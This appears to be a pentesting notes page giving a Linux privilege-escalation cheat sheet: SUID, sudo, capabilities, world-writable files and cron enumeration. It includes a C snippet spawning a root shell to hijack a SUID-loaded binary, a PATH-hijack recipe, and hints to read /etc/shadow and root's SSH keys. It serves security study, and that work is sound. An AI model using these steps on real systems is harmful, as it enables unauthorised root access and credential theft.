---
title: "Linux"
weight: 1
description: "Learn about various techniques and methods for privilege escalation on Linux system, including exploiting weak permissions, SUID, and more, with detailed notes and code examples."
---

# Linux Privilege Escalation


## Vulnerable program

Search scripts that execute programs. Search for **any vulnerable version**. One example: chkrootkit v0.49 (running as root)

```sh
ps aux
```

{{< hint style=notes >}}
**Note**: it's possible that another user (e.g., root) is running a cron job that executes a script periodically, which you may not be able to see. Therefore, it's crucial to identify and enumerate all potential programs that could be vulnerable.
{{< /hint >}}

---

## Weak Permissions

```sh
# World-writable files - Ex: maybe you can edit shadow file
find / -not -type l -perm -o+w
```

---

## Sudo

```sh
sudo -l
# Search on https://gtfobins.github.io/ how to exploit
```

---

## SUID 

Find all SUID binaries:
```bash
find / -perm -4000 2>/dev/null
```

**Well-known binary**

Search for the binary on [GTFOBins](https://gtfobins.github.io) to identify potential exploitation techniques.


**Custom binary**

Premise: you have `binary_name` (with suid) that use/load/execute `loaded_binary`

Extract strings from the binary – look for shared libraries or binaries being loaded / executed at runtime

```sh
strings binary_name
```

**(1) Method**

```sh
cp /bin/bash /path/to/loaded_binary
```

**(2) Method**

Delete the loaded binary and replace with a new one:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("/bin/bash -i"); 
    return 0;
}
```

```sh
# Compile
gcc binary.c -o <loaded_binary>
# Run the binary
./binary_name
```

---

## Capabilities

Since Linux version 2.2, the system has divided the traditional superuser privileges into distinct units called capabilities \[[🔗](https://man7.org/linux/man-pages/man7/capabilities.7.html)]. These capabilities can be independently enabled or disabled, offering more fine-grained control over process privileges. However, if misconfigured, they can be exploited by an attacker to escalate privileges and gain root access.

```sh
/usr/sbin/getcap -r / 2>/dev/null
```

Search for the binary on [GTFOBins](https://gtfobins.github.io) to identify potential exploitation techniques.


---

## Email

Analyze the email for any sensitive information:

```bash
ls /var/mail
```


---

## Other

* `sudo -l`
  * setenv?
* SUID/GUID
* Look for capabilities
* History Files
* Docker group
* Cron jobs
* SSH Keys
* PATH
* NFS
* Writable /etc/shadow
* Writable /etc/passwd
* Are there scripts that use commands?
  * If the command is executed without full path you can modify PATH variable
  * `strings <program_name>`
  * you see `tail -f /var/log/nginx/access.log`
  * ```sh
    #!/bin/bash
    /bin/bash -p
    ```
  * `chmod +x /tmp/tail`
  * `export PATH=/tmp:$PATH`
  * `./<program_name>`
* Is there a database? Can I access to it?
  * Look at config file or source code of webpages connecting to db
* Look at the source code of the php,py,jsp ... files of the website
  * Especially login files. Any password?
* Writable authorized\_key folder?
  * generate new ssh keys
* Can I read some file with sudo?
  * /root/root.txt, /etc/shadow, /root/.ssh/id\_rsa
* Can I write a file in the root user directory?
  * generate ssh key with ssh-keygen and save it in the root user dir
* Kernel Exploits
* Linpeas.sh
* [GTFObins](https://gtfobins.github.io)
